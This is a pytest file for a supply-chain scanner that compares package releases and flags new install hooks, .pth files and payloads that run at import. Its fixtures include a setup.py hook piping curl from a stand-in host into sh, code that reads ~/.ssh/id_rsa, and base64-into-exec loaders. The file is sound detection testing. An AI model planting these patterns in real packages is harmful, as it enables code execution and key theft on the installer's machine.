from dataclasses import replace

from garnet_guard.engine import run_checks
from garnet_guard.models import Change, FactError, ReleaseFacts, Severity, TagInfo, Verdict
from tests.builders import prov, release

CHANGE = Change("pypi", "demo", "1.0", "1.1")
INIT = "def hello():\n    return 1\n"
PAYLOAD = (
    "import subprocess, threading\n"
    "def _run():\n    subprocess.Popen(['python', 'demo/_rt/start.py'])\n"
    "threading.Thread(target=_run, daemon=True).start()\n"
)


def rules(base, cand) -> set[str]:
    return {f.rule_id for f in run_checks(CHANGE, base, cand).findings}


def test_clean_update_passes() -> None:
    result = run_checks(
        CHANGE,
        release("1.0", {"demo/__init__.py": INIT}),
        release("1.1", {"demo/__init__.py": INIT + "X=2\n"}),
    )
    assert result.verdict == Verdict.PASS and result.findings == ()


# GRN-T001
def test_lost_provenance_fires() -> None:
    assert "GRN-T001" in rules(release("1.0"), release("1.1", provenance="none"))


def test_lost_provenance_quiet_when_baseline_never_attested() -> None:
    assert "GRN-T001" not in rules(
        release("1.0", provenance="none"), release("1.1", provenance="none")
    )


def test_lost_provenance_unknown_is_not_pass() -> None:
    assert "GRN-E001" in rules(release("1.0"), release("1.1", provenance=None))


# GRN-T002 / T003
def test_publisher_changed_fires() -> None:
    cand = release(
        "1.1", provenance=prov("demo-1.1-py3-none-any.whl", repo="github.com/evil/r", repo_id="2")
    )
    assert "GRN-T002" in rules(release("1.0"), cand)


def test_publisher_rename_with_same_repo_id_is_quiet() -> None:
    cand = release(
        "1.1",
        provenance=prov("demo-1.1-py3-none-any.whl", repo="github.com/o/renamed", repo_id="1"),
    )
    assert "GRN-T002" not in rules(release("1.0"), cand)


def test_workflow_changed_fires() -> None:
    cand = release(
        "1.1", provenance=prov("demo-1.1-py3-none-any.whl", workflow=".github/workflows/other.yml")
    )
    assert rules(release("1.0"), cand) == {"GRN-T003"}


# GRN-T004
def test_missing_tag_fires_only_when_baseline_tagged() -> None:
    assert "GRN-T004" in rules(release("1.0"), release("1.1", tag=False))
    assert "GRN-T004" not in rules(release("1.0", tag=False), release("1.1", tag=False))


# GRN-T007
def test_invalid_attestation_blocks() -> None:
    cand = release("1.1", provenance=prov("demo-1.1-py3-none-any.whl", verified=False))
    result = run_checks(CHANGE, release("1.0"), cand)
    assert "GRN-T007" in {f.rule_id for f in result.findings}
    assert result.verdict == Verdict.BLOCK


# GRN-C001
def test_new_pth_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "import os; os.getcwd()\n"})
    assert rules(base, cand) == {"GRN-C001"}


def test_unchanged_path_pth_is_quiet() -> None:
    base = release("1.0", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    assert "GRN-C001" not in rules(base, cand)


def test_pth_gaining_import_line_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT, "demo.pth": "/some/path\n"})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo.pth": "/some/path\nimport demo._boot\n"})
    assert "GRN-C001" in rules(base, cand)


# GRN-C003
def test_import_time_payload_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT + PAYLOAD})
    result = run_checks(CHANGE, base, cand)
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.severity == Severity.WARN
    assert "subprocess.Popen" in f.evidence[0].summary and "_run()" in f.evidence[0].summary


def test_existing_import_time_call_is_quiet() -> None:
    src = INIT + PAYLOAD
    assert "GRN-C003" not in rules(
        release("1.0", {"demo/__init__.py": src}), release("1.1", {"demo/__init__.py": src})
    )


def test_subprocess_inside_uncalled_function_is_quiet() -> None:
    src = INIT + "import subprocess\ndef run():\n    subprocess.run(['ls'])\n"
    assert "GRN-C003" not in rules(
        release("1.0", {"demo/__init__.py": INIT}), release("1.1", {"demo/__init__.py": src})
    )


def test_moved_unchanged_module_is_quiet() -> None:
    vendored = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat.py": vendored})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/_external/compat.py": vendored})
    assert "GRN-C003" not in rules(base, cand)


def test_moved_and_changed_module_fires() -> None:
    vendored = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat.py": vendored})
    cand = release(
        "1.1", {"demo/__init__.py": INIT, "demo/_external/compat.py": vendored + "X = 1\n"}
    )
    assert "GRN-C003" in rules(base, cand)


def test_moved_vendored_package_with_edits_compares_to_old_path() -> None:
    old = "import os\nos.system('true')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo/_lib/compat/numpy/__init__.py": old})
    moved = {"demo/__init__.py": INIT, "demo/_external/compat/numpy/__init__.py": old + "X = 1\n"}
    assert "GRN-C003" not in rules(base, release("1.1", moved))
    moved["demo/_external/compat/numpy/__init__.py"] = old + "exec('1')\n"
    assert "GRN-C003" in rules(base, release("1.1", moved))


# GRN-C003 in test files
TEST_PAYLOAD = "import importlib\nMODS = [importlib.import_module(m) for m in ('a', 'b')]\n"


def c003(base, cand):
    return [f for f in run_checks(CHANGE, base, cand).findings if f.rule_id == "GRN-C003"]


def test_test_file_reports_at_info() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/tests/test_api.py": TEST_PAYLOAD})
    [f] = c003(base, cand)
    assert f.severity == Severity.INFO and f.default_severity == Severity.WARN
    assert "test module(s)" in f.title
    assert run_checks(CHANGE, base, cand).verdict == Verdict.PASS


def test_conftest_and_test_prefix_count_as_tests() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    for path in ("conftest.py", "demo/test_util.py"):
        [f] = c003(base, release("1.1", {"demo/__init__.py": INIT, path: TEST_PAYLOAD}))
        assert f.severity == Severity.INFO, path


def test_test_file_imported_by_package_code_warns() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    for importer in (
        "from .tests import _boot\n",
        "import demo.tests._boot\n",
        "from demo.tests import _boot\n",
        "from . import tests\n",  # tests/__init__.py imports _boot
    ):
        cand = release(
            "1.1",
            {
                "demo/__init__.py": INIT + importer,
                "demo/tests/__init__.py": "from . import _boot\n",
                "demo/tests/_boot.py": PAYLOAD,
            },
        )
        [f] = c003(base, cand)
        assert f.severity == Severity.WARN, importer


def test_test_file_named_by_entry_point_warns() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release(
        "1.1",
        {
            "demo/__init__.py": INIT,
            "demo/tests/plugin.py": PAYLOAD,
            "demo-1.1.dist-info/entry_points.txt": "[pytest11]\ndemo = demo.tests.plugin\n",
        },
    )
    [f] = c003(base, cand)
    assert f.severity == Severity.WARN


def test_test_and_package_findings_are_separate() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release(
        "1.1", {"demo/__init__.py": INIT + PAYLOAD, "demo/tests/test_api.py": TEST_PAYLOAD}
    )
    assert sorted(f.severity for f in c003(base, cand)) == [Severity.INFO, Severity.WARN]


# GRN-T004 messages
def test_tag_finding_names_each_repo() -> None:
    base = replace(
        release("1.0"), source_repo="scipy/scipy", tag=TagInfo("v1.0", "abc", "scipy/scipy")
    )
    cand = replace(
        release("1.1", tag=False),
        source_repo="scipy/scipy-release",
        tag_repos=("scipy/scipy-release", "scipy/scipy"),
    )
    [f] = [f for f in run_checks(CHANGE, base, cand).findings if f.rule_id == "GRN-T004"]
    assert f.title == (
        "1.0 has a tag in github.com/scipy/scipy, "
        "but github.com/scipy/scipy-release or github.com/scipy/scipy has none for 1.1"
    )
    assert f.evidence[0].url == "https://github.com/scipy/scipy/tree/v1.0"


# errors
def test_fact_errors_become_findings() -> None:
    cand = replace(
        release("1.1"), errors=(FactError("GRN-E001", "OSV lookup failed", ("GRN-K001",)),)
    )
    result = run_checks(CHANGE, release("1.0"), cand)
    assert [f.rule_id for f in result.findings] == ["GRN-E001"]
    assert result.verdict == Verdict.WARN


def test_known_malicious_blocks() -> None:
    cand = replace(release("1.1"), advisories=("MAL-2026-1",), advisories_checked=True)
    assert run_checks(CHANGE, release("1.0"), cand).verdict == Verdict.BLOCK


def test_unparseable_new_file_is_e002() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT, "demo/x.py": "print 'py2'\n"})
    assert "GRN-E002" in rules(base, cand)


def test_payload_through_lambda_or_class_init_fires() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    lam = INIT + "import os\n(lambda: os.system('id'))()\n"
    cls = (
        INIT
        + "import os\nclass _Boot:\n    def __init__(self):\n        os.system('id')\n_Boot()\n"
    )
    assert "GRN-C003" in rules(base, release("1.1", {"demo/__init__.py": lam}))
    assert "GRN-C003" in rules(base, release("1.1", {"demo/__init__.py": cls}))


def test_base64_into_existing_exec_fires() -> None:
    # typing-inspection builds helpers with exec at import; a release that starts
    # decoding what it execs is a new thing, not the same call.
    old = INIT + "exec('X = 1')\n"
    new = old + "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"
    base = release("1.0", {"demo/__init__.py": old})
    [f] = [f for f in run_checks(CHANGE, base, release("1.1", {"demo/__init__.py": new})).findings]
    assert f.rule_id == "GRN-C003"
    assert "base64.b64decode → exec" in f.evidence[0].summary
    assert "GRN-C003" not in rules(base, release("1.1", {"demo/__init__.py": old + "Y = 2\n"}))


# GRN-C002: setup.py anywhere, and releases without a trusted sdist
SETUP = "from setuptools import setup\nsetup(name='demo')\n"
SETUP_HOOK = (
    "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n"
    "class PostInstall(install):\n    def run(self):\n        install.run(self)\n"
    "        os.system('curl https://example.invalid/x | sh')\n\n"
    "setup(name='demo', cmdclass={'install': PostInstall})\n"
)
SRC = {"demo/__init__.py": INIT, "setup.py": SETUP}


def _sdist(version: str, files: dict[str, str]) -> ReleaseFacts:
    return release(version, sdist_files=files, sdist_only=True)


def test_setup_py_install_hook_fires() -> None:
    # The classic shape: a cmdclass whose run() fetches and executes something.
    result = run_checks(CHANGE, _sdist("1.0", SRC), _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C002"]
    assert "setup.py:8 calls os.system (in PostInstall.run())" in f.evidence[0].summary


def test_sdist_only_release_after_wheel_only_is_still_compared() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = _sdist(
        "1.1", {"demo/__init__.py": INIT + "import os\nos.system('id')\n", "setup.py": SETUP_HOOK}
    )
    result = run_checks(CHANGE, base, cand)
    ids = {f.rule_id for f in result.findings}
    assert {"GRN-C002", "GRN-C003"} <= ids
    [c003] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert "different kinds of files" in c003.evidence[-1].summary


def test_setup_py_in_a_release_that_adds_an_sdist_counts_as_new() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    cand = release("1.1", {"demo/__init__.py": INIT}, sdist_files={**SRC, "setup.py": SETUP_HOOK})
    assert "GRN-C002" in rules(base, cand)
    # Not when the trusted sdist exists but couldn't be read: that is GRN-E001's job.
    base_unread = release("1.0", {"demo/__init__.py": INIT}, sdist_files=None)
    base_unread = replace(
        base_unread,
        artifacts=base_unread.artifacts
        + release("1.0", sdist_files={}, sdist_only=True).artifacts[:1],
    )
    unread = replace(base_unread.artifacts[1], inspected=False)
    base_unread = replace(base_unread, artifacts=(base_unread.artifacts[0], unread))
    assert "GRN-C002" not in rules(base_unread, cand)


def test_unchanged_setup_py_hook_is_quiet() -> None:
    assert "GRN-C002" not in rules(
        _sdist("1.0", {**SRC, "setup.py": SETUP_HOOK}),
        _sdist("1.1", {**SRC, "setup.py": SETUP_HOOK}),
    )


# GRN-C001: where a .pth lands
def test_pth_under_the_versioned_data_folder_is_the_same_file() -> None:
    base = release(
        "1.0", {"demo/__init__.py": INIT, "demo-1.0.data/purelib/demo.pth": "import demo\n"}
    )
    cand = release(
        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/purelib/demo.pth": "import demo\n"}
    )
    assert "GRN-C001" not in rules(base, cand)
    gained = release(
        "1.1",
        {
            "demo/__init__.py": INIT,
            "demo-1.1.data/purelib/demo.pth": "import demo\nimport demo._boot\n",
        },
    )
    assert "GRN-C001" in rules(base, gained)


def test_pth_outside_site_packages_root_never_runs() -> None:
    base = release("1.0", {"demo/__init__.py": INIT})
    nested = release("1.1", {"demo/__init__.py": INIT, "demo/data/x.pth": "import os\n"})
    scripts = release(
        "1.1", {"demo/__init__.py": INIT, "demo-1.1.data/scripts/x.pth": "import os\n"}
    )
    assert "GRN-C001" not in rules(base, nested)
    assert "GRN-C001" not in rules(base, scripts)
    assert "GRN-C001" in rules(
        base,
        release("1.1", {"demo/__init__.py": INIT, "demo-1.1.data/platlib/x.pth": "import os\n"}),
    )


def test_renamed_pth_with_the_same_lines_is_quiet() -> None:
    line = "import sys, types, os; p = os.path.join(sys._getframe(1).f_locals['sitedir'], 'demo')\n"
    base = release("1.0", {"demo/__init__.py": INIT, "demo-1.0-py3.9-nspkg.pth": line})
    assert "GRN-C001" not in rules(
        base, release("1.1", {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line})
    )
    assert "GRN-C001" in rules(
        base,
        release(
            "1.1",
            {"demo/__init__.py": INIT, "demo-1.1-py3.9-nspkg.pth": line + "import demo._boot\n"},
        ),
    )


def test_modules_under_purelib_keep_their_names_across_versions() -> None:
    mod = "import os\nos.system('id')\n"
    base = release("1.0", {"demo-1.0.data/purelib/demo/__init__.py": mod})
    cand = release("1.1", {"demo-1.1.data/purelib/demo/__init__.py": mod + "X = 1\n"})
    assert "GRN-C003" not in rules(base, cand)


# GRN-C003 across modules
def test_payload_reached_through_another_module_at_import_fires() -> None:
    # The memoryos 2.0.34 shape: a module-level get_logger() call, a same-module
    # helper, a function-local import, and the process start two modules away.
    base = {
        "memos/__init__.py": "from memos.api import client\n",
        "memos/api/__init__.py": "",
        "memos/api/client.py": "from memos.log import get_logger\nlogger = get_logger(__name__)\n",
        "memos/log.py": "def get_logger(name):\n    return name\n",
    }
    cand = {
        **base,
        "memos/log.py": (
            "def configure():\n    from memos._stage0 import trigger\n    trigger()\n\n"
            "def get_logger(name):\n    configure()\n    return name\n"
        ),
        "memos/_stage0.py": "import subprocess\n\ndef trigger():\n    subprocess.Popen(['memos/.sckit/bin'])\n",
    }
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.evidence[0].summary == (
        "new module memos/_stage0.py:4 calls subprocess.Popen "
        "(in trigger(), reached at import from memos/api/client.py)"
    )


def test_nested_function_started_on_a_thread_at_import_fires() -> None:
    # The mrmustard 0.7.4 shape: __init__ calls a checker at import, which
    # starts a thread on a function defined inside it.
    cand = {
        "demo/__init__.py": (
            "import threading\n\n"
            "def _check_tf_compatibility():\n"
            "    def _run():\n"
            "        import subprocess\n"
            "        subprocess.check_output(['sh', '-c', 'cat ~/.ssh/id_rsa'])\n"
            "    threading.Thread(target=_run, daemon=True).start()\n\n"
            "_check_tf_compatibility()\n"
        )
    }
    result = run_checks(CHANGE, release("1.0", {"demo/__init__.py": ""}), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.evidence[0].summary == (
        "demo/__init__.py:6 calls subprocess.check_output (in _run(), reached at import)"
    )


def test_module_the_trusted_version_could_not_parse_is_not_called_new() -> None:
    # multiprocess 0.70.12.2: the trusted wheel was built for Python 2, so its
    # copy of the module never parsed; the calls may be old.
    base = {"demo/__init__.py": "", "demo/work.py": "import os\nprint 'py2'\nos.system('x')\n"}
    cand = {"demo/__init__.py": "", "demo/work.py": "import os\nos.system('x')\n"}
    result = run_checks(CHANGE, release("1.0", base), release("1.1", cand))
    [f] = [f for f in result.findings if f.rule_id == "GRN-C003"]
    assert f.evidence[0].summary == "demo/work.py:2 calls os.system"
    assert f.evidence[1].summary == (
        "1.0 has demo/work.py too, but it couldn't be parsed, so these calls may not be new"
    )


def test_module_renamed_with_a_leading_underscore_is_the_same_module() -> None:
    # html5lib 1.0 renamed inputstream.py to _inputstream.py.
    body = "import socket\n\nsock = socket.socket()\n"
    base = {"demo/__init__.py": "", "demo/inputstream.py": body}
    cand = {"demo/__init__.py": "", "demo/_inputstream.py": body + "# 1.1\n"}
    assert "GRN-C003" not in rules(release("1.0", base), release("1.1", cand))
    worse = {"demo/__init__.py": "", "demo/_inputstream.py": body + "import os\nos.system('x')\n"}
    assert "GRN-C003" in rules(release("1.0", base), release("1.1", worse))


def test_function_in_another_module_that_nothing_calls_at_import_is_quiet() -> None:
    files = {
        "memos/__init__.py": "from memos import log\n",
        "memos/log.py": "import subprocess\n\ndef rotate():\n    subprocess.run(['logrotate'])\n",
    }
    assert "GRN-C003" not in rules(release("1.0", {"memos/__init__.py": ""}), release("1.1", files))


def test_getattr_on_the_module_object_fires() -> None:
    # The num2words 0.5.15 shape, with the DLL named .py left out.
    payload = (
        "import os, sys, ctypes\n"
        "try:\n    ct = getattr(sys.modules[__name__], 'ctypes')\n"
        "    getattr(ct, 'CDLL')(os.path.join('x', '_build.py'))\nexcept Exception:\n    pass\n"
    )
    base = release("1.0", {"demo/__init__.py": INIT})
    [f] = [
        f
        for f in run_checks(
            CHANGE, base, release("1.1", {"demo/__init__.py": INIT + payload})
        ).findings
    ]
    assert f.rule_id == "GRN-C003" and "ctypes.CDLL" in f.evidence[0].summary
